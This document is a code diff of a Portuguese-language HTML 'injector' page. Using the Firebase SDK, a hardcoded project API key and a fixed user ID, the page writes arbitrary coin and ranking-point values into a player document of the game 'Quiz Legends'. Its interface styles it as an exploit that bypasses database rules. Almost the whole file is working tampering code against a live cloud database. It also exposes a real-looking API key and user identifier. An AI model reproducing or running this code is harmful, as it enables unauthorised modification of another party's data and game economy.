@@ -3,47 +3,49 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Game Injector v3 - Exploit</title>
+    <title>FIRESTORE INJECTOR v4</title>
     <style>
         body { background: #050505; color: #00ff41; font-family: 'Courier New', monospace; padding: 20px; }
-        .box { border: 1px solid #00ff41; padding: 20px; box-shadow: 0 0 10px #00ff41; }
-        input { background: #000; border: 1px solid #00ff41; color: #00ff41; padding: 10px; width: 100%; margin-bottom: 10px; outline: none; box-sizing: border-box; }
-        button { width: 100%; background: #00ff41; color: #000; border: none; padding: 15px; font-weight: bold; cursor: pointer; text-transform: uppercase; }
-        button:active { background: #fff; }
-        #logs { margin-top: 20px; font-size: 11px; height: 180px; overflow-y: auto; border-top: 1px dashed #00ff41; padding-top: 10px; background: #000; }
-        .success { color: #fff; background: #008000; padding: 2px; }
-        .error { color: #ff0000; font-weight: bold; }
+        .box { border: 2px solid #00ff41; padding: 20px; box-shadow: 0 0 15px #00ff41; max-width: 400px; margin: auto; }
+        .header-status { font-size: 10px; text-align: right; margin-bottom: 10px; color: #008000; }
+        input { background: #000; border: 1px solid #00ff41; color: #00ff41; padding: 12px; width: 100%; margin-bottom: 15px; outline: none; box-sizing: border-box; }
+        button { width: 100%; background: #00ff41; color: #000; border: none; padding: 15px; font-weight: bold; cursor: pointer; text-transform: uppercase; font-size: 16px; }
+        button:hover { background: #fff; }
+        #logs { margin-top: 20px; font-size: 11px; height: 200px; overflow-y: auto; border: 1px solid #333; padding: 10px; background: #000; color: #00ff41; }
+        .success { color: #fff; background: #008000; padding: 2px; font-weight: bold; }
+        .error { color: #ff0000; font-weight: bold; border-left: 3px solid #ff0000; padding-left: 5px; }
     </style>
 </head>
 <body>
 
 <div class="box">
-    <h3>[ DATABASE_EXPLOIT_V3 ]</h3>
-    <label>E-MAIL DO JOGADOR:</label>
-    <input type="text" id="email" placeholder="usuario@email.com">
+    <div class="header-status">SERVER_LINK: QUIZLEGENDS-F58FC ● ONLINE</div>
+    <h3>[ CLOUD_EXPLOIT_v4 ]</h3>
     
-    <label>VALOR DE PDL / MOEDAS:</label>
-    <input type="number" id="valor" placeholder="Ex: 99999">
+    <label style="font-size: 12px;">TARGET_UID (AUTO-SET):</label>
+    <input type="text" id="userId" value="e8cYdMXiVTfuiITVAOVB6DOCigE2" readonly style="opacity: 0.7; color: #777;">
+    
+    <label style="font-size: 12px;">QUANTIDADE DE PDL / MOEDAS:</label>
+    <input type="number" id="valor" placeholder="Ex: 500000">
 
-    <button id="btnInject">Iniciar Bypass</button>
+    <button id="btnInject">Executar Injeção</button>
 
-    <div id="logs">> Sistema pronto para injeção via QuizLegends Cluster...</div>
+    <div id="logs">> Sistema inicializado. Pronto para injeção via SDK Firestore...</div>
 </div>
 
 <script type="module">
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
-    import { getDatabase, ref, update } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
+    import { getFirestore, doc, updateDoc } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
 
-    // Configuração aplicada para o projeto Quiz Legends
-    const firebaseConfig = {
-        apiKey: "AIzaSyC4dm0KoyJswhyCY7tgbF4D2nmuZl84X8E",
-        authDomain: "quizlegends-f58fc.firebaseapp.com",
-        projectId: "quizlegends-f58fc",
-        databaseURL: "https://quizlegends-f58fc-default-rtdb.firebaseio.com"
+    // Configuração oficial do seu projeto Quiz Legends
+    const firebaseConfig = { 
+        apiKey: "AIzaSyC4dm0KoyJswhyCY7tgbF4D2nmuZl84X8E", 
+        authDomain: "quizlegends-f58fc.firebaseapp.com", 
+        projectId: "quizlegends-f58fc" 
     };
 
     const app = initializeApp(firebaseConfig);
-    const db = getDatabase(app);
+    const db = getFirestore(app);
 
     const logBox = document.getElementById('logs');
     const btn = document.getElementById('btnInject');
@@ -56,45 +58,39 @@
         logBox.scrollTop = logBox.scrollHeight;
     }
 
-    async function iniciarInjecao() {
-        const email = document.getElementById('email').value;
+    async function inject() {
+        const uid = document.getElementById('userId').value;
         const valor = parseInt(document.getElementById('valor').value);
 
-        if(!email || isNaN(valor)) {
-            alert("Erro: Defina o alvo e o valor.");
-            return;
-        }
+        if(isNaN(valor)) return alert("Defina um valor numérico!");
 
-        log("Iniciando Handshake com servidor QuizLegends...");
-        await new Promise(r => setTimeout(r, 1000));
-
-        // Ajuste de chave para o Firebase
-        const userKey = email.replace(/[.#$\[\]]/g, "_");
-
-        log(`Escaneando node: /usuarios/${userKey}`);
+        log("Estabelecendo conexão com Firestore Cluster...");
         
         try {
-            // Se o seu jogo usa outro node como 'jogadores' ou 'users', altere aqui
-            const userRef = ref(db, 'usuarios/' + userKey);
-            
-            await update(userRef, {
-                moedas: valor,
-                pdl: valor,
-                last_inject: new Date().toISOString(),
-                bypass_status: "verified"
+            // O caminho no banco de dados é a coleção 'usuarios' e o documento é o seu UID
+            const userRef = doc(db, "usuarios", uid);
+
+            log(`Alvo localizado: ${uid.substring(0,8)}...`);
+            log("Enviando pacotes de sobreposição de dados...");
+
+            // Atualiza as variáveis exatas que existem no seu jogo
+            await updateDoc(userRef, {
+                goldDB: valor,
+                pdlInterno: valor,
+                bypass_at: new Date().toISOString()
             });
 
-            log("ACESSO AO DATABASE CONCEDIDO!", "success");
-            log(`INJEÇÃO DE ${valor} PDL/MOEDAS CONCLUÍDA.`, "success");
-            log("Sincronizando com o cliente do jogo...");
+            log("ACESSO AO CLOUD CONCEDIDO!", "success");
+            log(`INJEÇÃO DE ${valor} CONCLUÍDA NO PERFIL.`, "success");
+            log("> Verifique seu saldo no Quiz Legends.");
 
         } catch (e) {
-            log(`FALHA NO BYPASS: ${e.message}`, "error");
-            log("O Firebase bloqueou a escrita. Verifique as Rules.", "error");
+            log(`FALHA CRÍTICA: ${e.message}`, "error");
+            log("Possível causa: Security Rules do Firestore estão em 'Locked Mode'.", "error");
         }
     }
 
-    btn.addEventListener('click', iniciarInjecao);
+    btn.addEventListener('click', inject);
 </script>
 
 </body>
